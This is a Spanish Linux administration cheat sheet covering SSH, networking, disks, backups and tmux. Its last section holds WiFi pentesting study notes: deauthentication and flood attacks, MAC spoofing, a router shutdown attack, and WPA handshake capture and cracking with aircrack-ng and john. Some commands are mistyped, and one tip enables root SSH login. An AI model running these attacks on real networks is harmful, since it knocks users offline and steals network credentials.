[#SSH](#SSH)

[#ROLES-SNAPS](#ROLES-SNAPS)

[#ACTUALIZAR-VERSION](#ACTUALIZAR-VERSION)

[#HARDWARE-TECLADO](#HARDWARE-TECLADO)

[#NETWORKING](#NETWORKING)

[#PAQUETES-SOFTWARE](#PAQUETES-SOFTWARE)

[#DISCOS-PARTICIONES](#DISCOS-PARTICIONES)

[#ARCHIVOS](#ARCHIVOS)

[#BACKUP](#BACKUP)

[#PERFORMANCE](#PERFORMANCE)

[#VARIOS](#VARIOS)

[#TMUX](#TMUX)

[#WIFI](#WIFI)

------------

### SSH
  - Instalar: **apt-get install openssh-server**
  - Comprobar: **systemctl status ssh**
  - Permitir root: en **vi /etc/ssh/sshd_config** poner **PermitRootLogin yes** luego **systemctl restart sshd**
  - Timeout SSH de 1h:  en **vi /etc/ssh/sshd_config** poner **ClientAliveInterval  1200** y **ClientAliveCountMax 3** luego **systemctl restart sshd**
  - Intercambio claves SSH: https://domology.es/scripts-y-comandos-ssh-en-home-assistant/:
    - **ssh-keygen** cuando pregunte el nombre ponemos: **clave_internet**
    - **ssh-copy-id -i clave_internet.pub pi@192.168.0.2** contestamos yes y no ponemos contraseña pero luego nos pide nuestra contraseña
    - **cat clave_internet** y luego Load en puttygen y Save private key.
    - En putty\SSH\Auth ponemos la ruta al .ppk
  - 2FA: https://hackertarget.com/ssh-two-factor-google-authenticator/
  - validar cambios en /etc/ssh/sshd_config con **sshd -T**


### ROLES-SNAPS
  - **roles** añadir o quitar con: **tasksel** (http://spotwise.com/2008/11/05/adding-roles-to-ubuntu-server/). **sudo apt-get install tasksel**
  - **snaps** añadir o quitar desde la snap store (Snaps are applications packaged with all their dependencies to run on all popular Linux) (https://codeburst.io/how-to-install-and-use-snap-on-ubuntu-18-04-9fcb6e3b34f9)<br>
    - **snap search powershell** para buscar y para instalar **snap install powershell**
  - **IoTStack** https://github.com/gcgarner/IOTstack.git
  - RDP:
    - instalar xfce **sudo apt-get install xfce4**
    - que RDP use xfce **echo xfce4-session > ~/.xsession**
    - reiniciar: **sudo service xrdp restart**


### ACTUALIZAR-VERSION
  - Actualizar: **sudo apt-get update && apt-get upgrade**
  - Upgrade: **apt-get update && apt-get dist-upgrade**
  - Subir de version: **do-release-upgrade**
  - Version actual: **lsb_release -a**
  - ver si es un OS puro o basado en **cat /etc/os-release**


### HARDWARE-TECLADO
  - **dmidecode** lista el hardware
  - Configurar el teclado **sudo dpkg-reconfigure keyboard-configuration** (require reinicio)
  - **Impresoras:**
    - Iniciar impresion **systemctl start cups**
    - Contar cuantas impresoras hay **lpstat -t | grep device | wc -l**
  - **Procesador:**
    - arquitectura **dpkg --print-architecture**
    - procesador: **lscpu**
    - cuantos cores: **cat /proc/cpuinfo | grep processor | wc -l**
  - **Apagar/Encender dispositivo USB**
    - listar dispositivos USB **for device in $(ls /sys/bus/usb/devices/*/product); do echo $device;cat $device;done**
    - saldra algo como:
          /sys/bus/usb/devices/1-1.3/product
          Expansion Desk
          /sys/bus/usb/devices/usb1/product
          DWC OTG Controller
    - apargar dispositivo: **echo '1-1.3' | sudo tee /sys/bus/usb/drivers/usb/unbind**
    - encender dispositivo: **echo '1-1.3' | sudo tee /sys/bus/usb/drivers/usb/bind**
  - **Cambiar colores a consola:** PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ ' && LS_COLORS='rs=0:di=1;35:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:';



### NETWORKING
  - tabla de rutas: **netstat -rn**
  - ver trafico de red de cada interfaz: **cat /proc/net/dev**
  - comprobar si el puerto 3000 esta abierto: **echo '' > /dev/tcp/127.0.0.1/3000** si no da 'connection refuseVMC' es q esta abierto
  - comprobar estado de tarjetas en bonding (agregado) **cat /proc/net/bonding/bond0**
  - poner ip estática:
    Create a netplan configuration in the file /etc/netplan/99_config.yaml. The example assumes you are configuringeth0. Change the addresses, gateway4, and nameservers values to meet the requirements.
      ```    
        network:
          version: 2
          renderer: networkd
          ethernets:
            eth0:
              addresses:
                - 10.10.10.2/24
              gateway4: 10.10.10.1
              nameservers:
                  search: [mydomain, otherdomain]
                  addresses: [10.10.10.1, 1.1.1.1]
      ```                  
    The configuration can then be applied using the netplan command **sudo netplan apply**

  - **CENTOS/RHEL**
    - **nmtui** configuración de red gráfica
    - <img src="https://github.com/sergioalegre/OS_Tips/blob/master/pics/nmtui.jpg">
    - **ip addr** ver interfaces y estado
    - **nmcli** ver interfaces y estado
    - **ip r** ver tabla rutas
    - **ip link** ver estado de las interfaces
    - ejemplo (si la interfaz se llama em1):
      - **nmcli con mod em1 ipv4.method manual**
      - **nmcli connection modify em1 ipv4.addresses "10.162.32.52/25"**
      - **nmcli connection modify em1 ipv4.gateway "10.162.32.1"**
      - **nmcli con up em1**
    - problema conocido: no levanta la red:
    - <img src="https://github.com/sergioalegre/OS_Tips/blob/master/pics/Centos_no_levanta_la_red.jpg">


### PAQUETES-SOFTWARE
  - **dpkg -L <paquete>** ver donde se instalo el paquete
  - **sudo dpkg --configure -a** buscar si hay algun problema con algun paquete a corregir
  - **sudo apt purge <package_name>** eliminar archivos de configuracion del paquete
  - **apt-get autoclean** vaciar cache apt
  - **dpkg --configure -a** comprueba si haya paquetes 'a medio instalar' que haya que remediar


### DISCOS-PARTICIONES
  - **parted -l** ver discos fiscos y particiones
  - **lsblk** particiones y puntos de montaje
  - **cat /proc/partitions <paquete>** 'devices' particionados
  - **df -h** ver espacio libre en cada punto de montaje
  - **mkfs.ext4 /dev/sdb1** formatear partición en un formato concreto
  - comprobar sistema de ficheros en el siguiente arrnaque: **touch /forcefsck && reboot**
  - Conceptos LVM: https://www.redhat.com/sysadmin/lvm-vs-partitioning
  
  - Extender LVM:
  - <img src="https://github.com/sergioalegre/OS_Tips/blob/master/pics/Linux_Extend_LVM_Partition.jpg">
  
  - Convertir de MBR a GPT sin perder datos:
    1 - Download GParted Live CD
    2 – Boot from GParted Live CD. Select all options by default on boot and once the system started, in terminal (ALT+F2 and type terminal) type the following commands (let’s assume /dev/sda hard disk): we can see what is the desired disk letter at gparted
    **sudo gdisk /dev/sda**
    then type the **W** command to convert MBR to GPT partition table. You will get a message:
    Find checks complete. About to write GPT data. THIS WILL OVERWRITE EXISTING PARTITIONS!
    Do you want to proceed (Y/N): Y
    You type **Y** and if everything is ok with this convertion, you’ll get another message:
    OK; writing new GUID partition table (GPT) to /dev/sda. The operation completed successfully.
    Now the partition is GPT. Reboot
    3 – Resize partition



### ARCHIVOS
  - **updatedb** actualiza el indice de ficheros, luego con **locate** se puede buscar
  - **sudo du -h /home/ | sort -rh | head -20** top 20 carpetas de mas tamaño dentro de /home
  - buscar top 5 ficheros mas grandes:
      - **du -a / | sort -n -r | head -n 5**
      - ver tamaño en MB **ls -al --block-size=M**
  - **ncdu** utilidad para ver las carpetas por tamaño
  - cp y mv con progreso (-g) https://ostechnix.com/advanced-copy-add-progress-bar-to-cp-and-mv-commands-in-linux/
   - **scp -P 22222 pi@sergio.duckdns.org:/home/pi/Descargas/archivo.7z /home/sergio/**



### BACKUP
  - script.sh para poner un cron y hacer backup de un directorio concreto: comprimido, nombre basado en fecha, excluyendo algunos directorios y tipos de ficheros:
    - `cd /media/DISCO_USB_EXT/ZZ_backup_ha/ && zip -r "HA-backup-$(date +"%Y-%m-%d_%H-%M").zip" /home/homeassistant/.homeassistant/ -x "*.log" -x "/*tts/*" -x "*.db" -x "*.db-shm" -x "*.db-wal" -x "*.mp3" -x "/*deps/*" -x "/*www/camera_shots/*" -x "/*.git/*" -x "/*shell/gif_maker/venv/*"`


### LOGS
  - **dmesg | less** ver los de arraque con Av Pag y Re Pag.
  - **journalctl -xe** (CENTOS)


### PERFORMANCE
  - **htop**
  - **free** RAM: cuanta esta libre
  - **iostat 2** disco: en un sistema OK el %iowait cerca de 0% y %idle cerca del 100%
  - **atop** disco: dentro de atop pulsar **d** para ver que aplicaciones usan mas disco


### VARIOS
  - **history | less** ultimos 1000 comandos
  - **last -x | grep shutdown** fecha del ultimo apagado/reinicio
  - **tar czf archivo_comprimido.tgz <dirname>** comprimir un directorio
  - **tar zxvf <archive>** descomprimir

### TMUX
  - **apt-get install tmux**
  - **git clone https://github.com/gpakosz/.tmux.git**
  - instanciar: **tmux**
  - nuevo panel: **CTRL+B, n**
  - cambiar de panel: **CTRL+B, 'numero-panel'**
  - Dividir verticalmente: **CTRL+B , %**
  - Dividir horizontalmente: **CTRL+B, "**
  - cambiar de panel **CTRL+B , 'flechas'**


### WIFI
  - basado: **https://lbry.tv/@s4vitar:f/pentesting_redes_wifi**
  - requisito: tarjeta permita modo monitor (captura todos los paquetes que viajen por el aire)

  PREPARAR HW:
  - listar tarjetas **ifconfig** (saldra algo como wlan0)
  - activar modo monitor: **airmon-ng start wlan0**, luego hacemos **ifconfig** ahora la interfaz se llamar algo como wlan0mon (00:04)
  - matar wpa_supplicant y dhclient: **killall dhclient wpa_supplicant**
  - cambiar mac: **ifconfig wlan0 down** (no podemos cambiarla si esta activa) y luego **macchanger -a wlan0mon** (-a nos da una aleatoria). Podriamos poner la MAC que quisieramos con **macchanger --mac="poner_aqui_la_MAC" wlan0mon**. Con **macchanger -s wlan0mon** puedo ver la real y la nueva.
  - en .bashrc podemos hacer un script para 'preparar el entorno'. Enviamos la salida de outputs a /dev/null (00:16)
  - <img src="https://github.com/sergioalegre/OS_Tips/blob/master/pics/wifi1.JPG">
  - si nos da problemas el modo monitor, podemos resetear la red con **service network-manager restart**

  NUESTRO ENTORNO:
  - listar ESSIDs accesibles **iwlist wlan0 scan | grep ESSID -i**
  - invocamos la funcion con **monitorInit** (00:21)
  - Veremos nuestro entorno con **airodump-ng wlan0mon** nos enseñara las redes y los clientes conectados a ellas. El BBSI es la MAC del router, PWR es lo cercana que esta la red, cuando mas cercana a 0 señal mas fuerte (00:24) STATION es la MAC de un cliente conectado a alguna red (00:28), sabemos si el cliente esta activo (00:30) si aumenta el numero de Frames. Probe (00:33) te mostrara a clientes que estan buscando redes conocidas (a las que ya han estado conectados en el pasasdo) es util porque si sabemos que ese cliente busca esa red la podemos generar para engañarle (00:36-00:41) creo que esto se llama Evil Twin Attack.

  RED OBJETIVO:
  - para centrarnos en la red objetivo **airodump-ng --essid <nombre_ssid> wlan0mon** (00:42)
  - capturamos trafico **airodump-ng -w archivo_captura --essid <nombre_ssid> wlan0mon** (00:44) la idea es luego con tshark o wireshark cargar el archivo generado **tshark -r archivo_captura.cap**

  ATAQUES ACTIVOS (forzar reconexion de cliente expone el handshake):
  - Ataque de-autenticacion dirigido: capturar handshake expulsando a un cliente de la red. Funciona solo para WPA/WPA2 con PSK (00:47-00:53)
    - **airplay -ng -0 10 -e <nombre_ssid> -c <mac_cliente> wlan0mon** (00:51)

  - Ataque de-autenticacion global: expulsar a todos los clientes de la red, mas probable de obtener el handshake (00:53-00:59)
    - **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**
    - si queremos dejar una wifi KO (infinitos paquetes de de-autenticacion) **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**

  - Ataque de autenticación: autentica a un cliente en una red (00:59-01:05)
    - **airplay-ng -1 0 -e <nombre_ssid> -h <mac_falsa> wlan0mon**
    - Ataque de autenticacion masiva mdk3 **mdk3 wlan0mon a -a <mac_router>** inyectara miles de clientes saturandola. Si hay un cliente real esto le obliga a reautenticarse y obtendremos el handshake (01:02)

  - CTS Frame Attack: deja una red inoperativa para que los clientes sean deasociados y se autentiquen posteriormente (01:05-01:21)

  - Beacon Flood Mode Attack: genera muchos puntos de accesos en el mismo canal (channel) que otro objetivo dejandola invisible para otros usuarios (01:21-01:27)
    - **mkd3 wlan0mon b -c 1** en este ejemplo creamos cientos de redes de nombre aleatorio en el canal 1

  - Disassociation Amok Mode Attack (01:27-01:29)

  - Michael Shutdown Exploitation: supuestamente apaga un router (01:29-01:31)
    - **mdk3 wlan0mon m -t <mac_router>**

  ATAQUES PASIVOS (esperamos a que el cliente se reasocie).

  ANALISIS CAPTURA TRAFICO
  - Pyrit (01:35-01:44) **pyrit -r captura.cap analyze** nos parseara (filtrara) la info y nos enseñará solo la mas importante de la captura
  - tshark (01:44-01:51)

  - aircrack-ng: extraer el handshake (01:51-01:55)
    - extraer el hash desde el archivo .hccap **hccap2john captura.hccap > miHash**

  - fuerza bruta con john (01:55-01:59)
    - Capturamos **airodump-ng -c <numero_canal> -w Captura --essid <ssid> wlan0mon** y en paraleo deautenticamos **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**, esperamos a que aparezca el handshake y con **pyrit -r Captura.cap analyze** vemos que tenga 1 AP y 1 handshake al menos.
    - Convertir a .hccap: **aircrack-ng -J miCaptura Captura-01.cap**, luego **hccap2john miCaptura.hccap > miHash** asi tendremos la contraseña aun cifrada en CCMP.
    - Descifrar: **john --wordlist=diccionario.txt miHash** y nos dira la contraseña

  - fuerza bruta con aircrack: es mas sencillo que john xq automatiza pasos (01:59-02:00)
    - **aircrack-ng -w diccionario.txt Captura.cap**

  - bettercap (02:03-)

  AUMENTAR VELOCIDAD COMPUTO (02:05-02:24)
    - rainbow tables con airolib-ng o genpmk (02:10)

  QUE SE PUEDE SABER SIN ESTAR CONECTADO A LA RED (02:24)
    - ver el trafico http con ettercap, drifnet e iptables (02:31)
